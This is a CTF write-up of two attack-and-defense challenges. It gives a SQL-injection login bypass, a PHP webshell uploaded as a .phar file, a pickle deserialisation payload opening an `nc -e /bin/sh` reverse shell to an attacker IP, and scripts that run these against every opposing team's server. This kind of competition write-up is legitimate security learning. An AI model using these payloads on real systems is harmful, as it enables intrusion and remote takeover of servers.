# SiberSiaga x iHACK Semi Finals 2024 - Writeup
My first A&D style CTF, representing GPT-1010. It was not a flawless experience but I still kinda enjoyed it due to the good quality of challenges and learned a lot.<br><br>
It spanned 2 days with a total of 12 hours (1hr/round). Only thing to regret is I accidentally slept at night of day 1 without preparing for day 2 and one of our challenge instance got attacked in the morning of day 2 resulting in us losing all attack points due to 0% SLA. (Scoring: `(attacking_points * SLA) - deduction_points + sla_points + defensives_points`)<br>
In the end, we got exploits for 2 out of the 5 challanges.

## Table of Contents
- [Menu Board](#menu-board)
- [Feastify](#feastify)

## Menu Board
We were presented with only a static website showing menu without other options.<br>
After struggling for a few hours, I started checking server logs in `/var/log/menuboard/apache_access.log` and found other teams has been accessing our `login.php` and `add.php` to add menu items. Their usage of `.phar` files showed that the server is vulnerable to code execution with phar files.
<br><br>
In `login.php`, we are able to confirm the existence of an SQL injection vulnerability by submitting both fields with a single quote (') character which gives us a mysql error. We were able to exploit the vulnerability to dump the database but was unable to login due to the password was md5 encoded and password field cannot be injected.
![image](https://github.com/user-attachments/assets/a77cdc3d-28ef-4f8b-aea8-e9f27383d21f)
<br>
The turning point of this situation occured when sevreal teams gladly walked in before my eyes and showed me (feat. **Sudu_bediri, Kena Paksa, CSN**) how to use the webshell that **anti_1337** placed on us.<br>
![image](https://github.com/user-attachments/assets/3faec2d7-0e38-41a7-bceb-92bcccf2c855)
<br>
From there we are able to obtain the php source code and therefore get to see the login logic, which looked like this:
```php
$query = "SELECT username, password, role FROM users WHERE username='$username'";
$result = mysqli_query($conn, $query);
if (mysqli_num_rows($result) == 1) {
    $row = mysqli_fetch_assoc($result);
    if ($row['password'] == $hashed_password) {
        $_SESSION['username'] = $row['username'];
        $_SESSION['role'] = $row['role'];
        return true;
    } else {
        return false;
    }
```
Based on the source, we therefore can craft an injection query where username = `' union select 'Admin' as username, md5('1') as password, 'admin' as role -- g`, password = `1` to login.<br><br>
After that, we just need to create an menu item with a phar file as the cover image to gain RCE.<br>
Our webshell payload: (thanks **anti_1337** 😉)
```php
<?php system($_REQUEST['gptgpt123']);?>
```
Getting flag:
![image](https://github.com/user-attachments/assets/c93f3eba-3faa-4696-a0c2-69b643cb409b)

<details>
<summary>Attack automation</summary>

```py
import requests
from typing import Optional
import warnings

warnings.filterwarnings('ignore')


teams = {
    "REUN10N_0x94fbr": "172.16.107.11",
    "N3WBEES": "172.16.109.11",
    "Sudu_bediri": "172.16.106.11",
    "PERISAI FALLEN": "172.16.112.11",
    "CSN": "172.16.130.11",
    "Cookie Byte": "172.16.110.11",
    "n00bst3am": "172.16.114.11",
    "H1ddenL0ck": "172.16.129.11",
    "scap3G04T": "172.16.123.11",
    "Bømbåstïç S¡dë £¥€": "172.16.117.11",
    "idk": "172.16.101.11",
    "Darksid3rs": "172.16.121.11",
    "Sci3ntex": "172.16.122.11",
    "Kena Paksa ??": "172.16.127.11",
    "Lesgo Babey": "172.16.113.11",
    "Pleiades": "172.16.108.11",
    "sk1d_s3c": "172.16.125.11",
    "username": "172.16.105.11",
    "Cybertopia": "172.16.120.11",
    "whilefalsebr8": "172.16.116.11",
    "C1C4D4": "172.16.126.11",
    "P4NTH3R4": "172.16.119.11",
    "M53_A1ph4_Sh4rk!": "172.16.131.11",
    "Black Byte Society": "172.16.118.11",
    "Steady Gang": "172.16.102.11",
    "anti_1337": "172.16.103.11",
    "Satr1a_Jeb4t": "172.16.115.11",
    "Sentinels": "172.16.104.11",
    "B016": "172.16.128.11",
    "NT": "172.16.111.11"
}


def pwn(ip) -> Optional[str]:
    session = requests.session()
    try:
        burp0_url = f"https://{ip}:443/login.php"
        burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Accept-Language": "en-US", "Upgrade-Insecure-Requests": "1", "Origin": "https://172.16.118.11", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://172.16.118.11/login.php", "Accept-Encoding": "gzip, deflate, br", "Priority": "u=0, i", "Connection": "keep-alive"}
        burp0_data = {"username": "' union select 'Admin' as username, md5('1') as password, 'admin' as role -- g", "password": "1"}
        session.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False, timeout=2)
    except Exception as e:
        print(f"{ip} Error: {e}")
        return None

    try:
        burp0_url = f"https://{ip}:443/add.php"
        burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Accept-Language": "en-US", "Upgrade-Insecure-Requests": "1", "Origin": "https://172.16.118.11", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarylKLFBVni1R77A4as", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://172.16.118.11/add.php", "Accept-Encoding": "gzip, deflate, br", "Priority": "u=0, i", "Connection": "keep-alive"}
        burp0_data = "------WebKitFormBoundarylKLFBVni1R77A4as\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\naa\r\n------WebKitFormBoundarylKLFBVni1R77A4as\r\nContent-Disposition: form-data; name=\"description\"\r\n\r\naa\r\n------WebKitFormBoundarylKLFBVni1R77A4as\r\nContent-Disposition: form-data; name=\"category\"\r\n\r\n1\r\n------WebKitFormBoundarylKLFBVni1R77A4as\r\nContent-Disposition: form-data; name=\"tag\"\r\n\r\n1\r\n------WebKitFormBoundarylKLFBVni1R77A4as\r\nContent-Disposition: form-data; name=\"image\"; filename=\"something.phar\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php system($_REQUEST['gptgpt123']);?>\r\n------WebKitFormBoundarylKLFBVni1R77A4as\r\nContent-Disposition: form-data; name=\"price\"\r\n\r\n12\r\n------WebKitFormBoundarylKLFBVni1R77A4as\r\nContent-Disposition: form-data; name=\"draft\"\r\n\r\non\r\n------WebKitFormBoundarylKLFBVni1R77A4as\r\nContent-Disposition: form-data; name=\"draft\"\r\n\r\ntrue\r\n------WebKitFormBoundarylKLFBVni1R77A4as--\r\n"
        session.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False, timeout=2)
    except Exception as e:
        print(f"{ip} Error: {e}")
        return None

    try:
        burp0_url = f"https://{ip}:443/assets/uploads/img/something.phar?gptgpt123=/usr/local/bin/flag"
        burp0_headers = {"Sec-Ch-Ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Accept-Language": "en-US", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate, br", "Priority": "u=0, i", "Connection": "keep-alive"}
        resp = session.post(burp0_url, headers=burp0_headers, verify=False, timeout=2).text
        # print(resp)
        return resp
    except Exception as e:
        print(f"{ip} Error: {e}")
        return None
    return None


flags = []
n_ok, n_err = 0, 0
for name, ip in teams.items():
    flag = pwn(ip)
    if flag is None or "ihack24" not in flag:
        print(f"!!! NO FLAG {name}")
        n_err += 1
    else:
        print(f"Ok {name}")
        n_ok += 1
        flags.append(flag.strip())

print("\n".join(flags))
print()
print(",".join(flags))

print("Ok: ", n_ok, "Error: ", n_err)
```
</details>

[*Back to top*](#table-of-contents)


## Feastify
In the main webpage, every menu item leads us to a link to download an android app called feastify.<br>
If we directly access the service through port 8000 we would get an error saying `Access denied. This API is only accessible from Android devices.`
<br><br>
Therefore, we first download and run the app with packet capture enabled. After clicking around, we found that the `/api/submit_order` endpoint is POSTing some mystery data in base64. In the reverse engineered source code we can see that it has something to do with `pickler` library, which is a Java serialisation library for python's pickle format.
<br><br>
As pickle is famous for its RCE vulnerability (as seen in the official docs), we decided to try it.
![image](https://github.com/user-attachments/assets/4f1880d3-9ecb-4451-933e-f89e0f27210d)
The script below generates an attack payload abusing pickle's insecure deserialisation vulnerability.
```py
class P(object):
    def __reduce__(self):
        return (os.system,("nc -e /bin/sh 172.16.124.11 34512",))

data = {"orders":[{"item_id":21,"quantity":1}],"remarks":""}

pickledPayload = pickle.dumps(P())
enc = base64.b64encode(pickledPayload)
print(enc)
```
With `nc -lnvp 34512` running on our attacking machine, submitting the attack payload was able to get us a reverse shell on the victim server.

<details>
<summary>Payload submission automation</summary>

```py
import requests
import warnings

warnings.filterwarnings('ignore')

teams = {
    "REUN10N_0x94fbr": "172.16.107.11",
    "N3WBEES": "172.16.109.11",
    "Sudu_bediri": "172.16.106.11",
    "PERISAI FALLEN": "172.16.112.11",
    "CSN": "172.16.130.11",
    "Cookie Byte": "172.16.110.11",
    "n00bst3am": "172.16.114.11",
    "H1ddenL0ck": "172.16.129.11",
    "scap3G04T": "172.16.123.11",
    "Bømbåstïç S¡dë £¥€": "172.16.117.11",
    "idk": "172.16.101.11",
    "Darksid3rs": "172.16.121.11",
    "Sci3ntex": "172.16.122.11",
    "Kena Paksa ??": "172.16.127.11",
    "Lesgo Babey": "172.16.113.11",
    "Pleiades": "172.16.108.11",
    "sk1d_s3c": "172.16.125.11",
    "username": "172.16.105.11",
    "Cybertopia": "172.16.120.11",
    "whilefalsebr8": "172.16.116.11",
    "C1C4D4": "172.16.126.11",
    "P4NTH3R4": "172.16.119.11",
    "M53_A1ph4_Sh4rk!": "172.16.131.11",
    "Black Byte Society": "172.16.118.11",
    "Steady Gang": "172.16.102.11",
    "anti_1337": "172.16.103.11",
    "Satr1a_Jeb4t": "172.16.115.11",
    "Sentinels": "172.16.104.11",
    "B016": "172.16.128.11",
    "NT": "172.16.111.11"
}

# Define the URL and headers
headers = {
    'Cookie': 'session_id=a37786e6-8e29-492b-9165-c3d6e6407e69',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; SM-G955F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.193 Safari/537.36',
    'Content-Type': 'application/json; charset=utf-8',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive'
}

# Define the JSON data to be sent in the request body
data = {
    # edit your payload here!!!
    "data": "gASVGAAAAAAAAACMBHRpbWWUjAVzbGVlcJSTlEsAhZRSlC4=" # sleep 0
}

n_ok, n_err = 0, 0
# Send the POST request
for name, ip in teams.items():
    url = f"https://{ip}:8000/api/submit_order"
    try:
        response = requests.post(url, headers=headers, json=data, verify=False, timeout=2)
        print(response.status_code)
    except:
        print("Error: " + name)
        n_err += 1
        continue
    print("Ok " + name)
    n_ok += 1

print("Ok: ", n_ok, "Error: ", n_err)

```
</details>

[*Back to top*](#table-of-contents)
